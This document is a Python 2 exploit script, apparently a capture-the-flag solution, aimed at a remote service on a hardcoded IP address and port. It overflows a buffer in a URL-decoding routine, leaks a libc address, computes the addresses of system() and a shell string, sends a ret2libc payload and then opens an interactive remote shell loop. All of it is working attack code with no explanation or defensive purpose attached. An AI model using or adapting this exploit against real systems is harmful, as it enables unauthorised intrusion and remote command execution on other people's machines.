# -*- coding: cp936 -*-
import socket
import time
import struct


flag = 0
tmp = ""

sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
#sock.connect(('127.0.0.1',4444))
sock.connect(('119.254.101.197',10001))
def R():
    global sock
    time.sleep(1)
    re = sock.recv(2048)
    #re += sock.recv(1024)
    print re
    return re
def RR():
    global sock
    time.sleep(1)
    re = sock.recv(2048)
#    re += sock.recv(1024)
    print re
    pos1 = re.find("Decode Result: ")
    re1 = re[pos1+15:]
    pos2 = re1.find("Decode Result: ")
    re2 = re1[pos2+15:pos2+19]
    print re2.encode("hex")
    return re2
def S(a):
    global sock
    sock.send(a+'\x0a')
    print a
    return 1
def G():
    global sock
    time.sleep(1)
    return sock.recv(0x40000)
def shell():
    global sock
    while 1:
        time.sleep(0.5)
        order = raw_input('#')
        sock.send(order + '\n')
        print sock.recv(1024)
    return 1
#offset = 0x00049F50 - 0x0003C000
offset = 0x4d280 - 0x40190
sh_offset = 0x160a24 - 0x4d280
#raw_input('here')
target = struct.pack('I',0x08048590)
R()
payload = "http://"+"a"*0x5c+'%2\x00aaaaaa'+'a'*0x30+'bb'+struct.pack("I",0x080488BC)+struct.pack("I",0x08049dc8)+'cccc'+'dddd'+'eeee'+'a'*0x9c+'z'*12 + target + 'zzzz'
#raw_input("!!!!!")
S(payload)

print_addr = struct.unpack('I',RR())[0]
time.sleep(3)
system_addr = print_addr - offset
sh_addr = print_addr + sh_offset
print 'libc function:',hex(system_addr),hex(sh_addr)
#raw_input('pause')
payload2 = "http://"+"a"*0x5c+'%2\x00aaaaaa'+'a'*0x30+'bb'+struct.pack("I",system_addr)+struct.pack("I",sh_addr)+struct.pack("I",sh_addr)+struct.pack("I",0)
S(payload2)
R()
print("[+] Shell ready:")

while 1:
    
    sock.send(raw_input('#')+'\x0a')
    print sock.recv(1024)
sock.close()


